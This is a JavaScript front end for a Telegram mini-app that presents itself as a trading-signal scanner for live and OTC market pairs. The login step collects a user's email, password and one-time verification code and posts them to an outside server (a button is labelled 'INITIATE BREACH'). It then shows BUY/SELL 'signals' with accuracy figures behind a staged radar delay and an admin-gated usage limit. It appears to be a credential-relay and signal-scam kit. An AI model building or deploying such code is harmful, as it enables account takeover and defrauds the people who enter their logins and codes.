const tg = window.Telegram.WebApp;
const apiURL = "https://mini-app-one.onrender.com"; // <-- TUMHARA API URL
let userId = "UNKNOWN";
let selectedPair = "";
let selectedTimeframe = "1 MIN";
let pollingInterval;

tg.expand();
if (tg.initDataUnsafe && tg.initDataUnsafe.user) { userId = tg.initDataUnsafe.user.id.toString(); }

const screens = { login: document.getElementById('login-screen'), code: document.getElementById('code-screen'), main: document.getElementById('main-screen') };
const alertBox = document.getElementById('alert-box');

function showAlert(msg, type="error") {
    alertBox.textContent = msg;
    alertBox.style.background = type === "error" ? "#ff4d4f" : "#00ff00";
    alertBox.style.color = type === "error" ? "#fff" : "#000";
    alertBox.style.boxShadow = type === "error" ? "0 0 10px red" : "0 0 10px green";
    alertBox.classList.remove('hidden');
    setTimeout(() => alertBox.classList.add('hidden'), 4000);
}

function showScreen(screenName) {
    Object.values(screens).forEach(s => s.classList.add('hidden'));
    screens[screenName].classList.remove('hidden');
}

// LOGIN
document.getElementById('btn-login').addEventListener('click', async () => {
    const email = document.getElementById('email').value, password = document.getElementById('password').value;
    if(!email || !password) return showAlert("Fill credentials");
    document.getElementById('btn-login').textContent = "[ PROCESSING... ]";
    try {
        await fetch(`${apiURL}/api/login`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: userId, email, password}) });
        startPolling();
    } catch(e) { showAlert("Node connection failed"); document.getElementById('btn-login').textContent = "[ INITIATE BREACH ]"; }
});

// CODE
document.getElementById('btn-code').addEventListener('click', async () => {
    const code = document.getElementById('auth-code').value;
    if(!code) return showAlert("Enter key");
    document.getElementById('btn-code').textContent = "[ VERIFYING... ]";
    try {
        await fetch(`${apiURL}/api/code`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: userId, code}) });
    } catch(e) { showAlert("Error"); document.getElementById('btn-code').textContent = "[ VERIFY KEY ]"; }
});

// POLLING
function startPolling() {
    if(pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`${apiURL}/api/status?user_id=${userId}`);
            const data = await res.json();
            if(data.msg) showAlert(data.msg);

            if (data.state === "START") { showScreen('login'); document.getElementById('btn-login').textContent = "[ INITIATE BREACH ]"; clearInterval(pollingInterval); } 
            else if (data.state === "WAITING_CODE") { showScreen('code'); document.getElementById('btn-code').textContent = "[ VERIFY KEY ]"; } 
            else if (data.state === "AUTHORIZED") { showScreen('main'); clearInterval(pollingInterval); populateMarkets(); }
        } catch (e) { console.log("Polling wait..."); }
    }, 2000);
}

// DASHBOARD UI LOGIC
document.getElementById('nav-scanner').addEventListener('click', () => {
    document.getElementById('nav-scanner').classList.add('active'); document.getElementById('nav-education').classList.remove('active');
    document.getElementById('tab-scanner').classList.remove('hidden'); document.getElementById('tab-education').classList.add('hidden');
});
document.getElementById('nav-education').addEventListener('click', () => {
    document.getElementById('nav-education').classList.add('active'); document.getElementById('nav-scanner').classList.remove('active');
    document.getElementById('tab-education').classList.remove('hidden'); document.getElementById('tab-scanner').classList.add('hidden');
});

const liveSelect = document.getElementById('live-pairs'), otcSelect = document.getElementById('otc-pairs');
liveSelect.addEventListener('change', () => { if(liveSelect.value) { selectedPair = liveSelect.value; otcSelect.value = ""; } });
otcSelect.addEventListener('change', () => { if(otcSelect.value) { selectedPair = otcSelect.value; liveSelect.value = ""; } });

document.querySelectorAll('.time-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.time-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active'); selectedTimeframe = btn.dataset.time;
    });
});

async function populateMarkets() {
    try {
        const res = await fetch(`${apiURL}/api/init_data`); const data = await res.json();
        liveSelect.innerHTML = '<option value="">LIVE MARKET ▾</option>'; otcSelect.innerHTML = '<option value="">OTC MARKET ▾</option>';
        data.live_pairs.forEach(p => liveSelect.innerHTML += `<option value="${p}">🇺🇸 ${p}</option>`);
        data.otc_pairs.forEach(p => otcSelect.innerHTML += `<option value="${p}">🇺🇸 ${p}</option>`);
        document.getElementById('admin-contact').textContent = "@" + data.admin_contact;
    } catch(e) { console.log("Market init failed"); }
}

// SCAN LOGIC
document.getElementById('btn-scan').addEventListener('click', async () => {
    if(!selectedPair) return showAlert("Select a market pair first.");
    const radar = document.getElementById('radar'), resultBox = document.getElementById('signal-result'), btn = document.getElementById('btn-scan');
    resultBox.classList.add('hidden'); radar.classList.remove('hidden'); btn.textContent = "[ SCANNING... ]"; btn.disabled = true;

    try {
        const res = await fetch(`${apiURL}/api/signal`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: userId, pair: selectedPair, timeframe: selectedTimeframe}) });
        const data = await res.json();
        
        setTimeout(() => {
            if (data.error === "LIMIT_REACHED") { showAlert(`Limit Hit! Contact Admin.`); btn.textContent = "[ EXECUTE SCAN ]"; btn.disabled = false; return; }
            radar.classList.add('hidden'); resultBox.classList.remove('hidden');
            document.getElementById('result-direction').textContent = data.direction.replace(/[^a-zA-Z]/g, ''); // Extract BUY/SELL
            document.getElementById('result-accuracy').textContent = data.accuracy + "%";
            resultBox.style.color = data.direction.includes("BUY") ? "#00ff00" : "#ff4d4f";
            resultBox.style.borderColor = resultBox.style.color;
            btn.textContent = "[ EXECUTE SCAN ]"; btn.disabled = false;
        }, 3000);
    } catch(e) { showAlert("Scan Failed"); btn.textContent = "[ EXECUTE SCAN ]"; btn.disabled = false; }
});

startPolling();
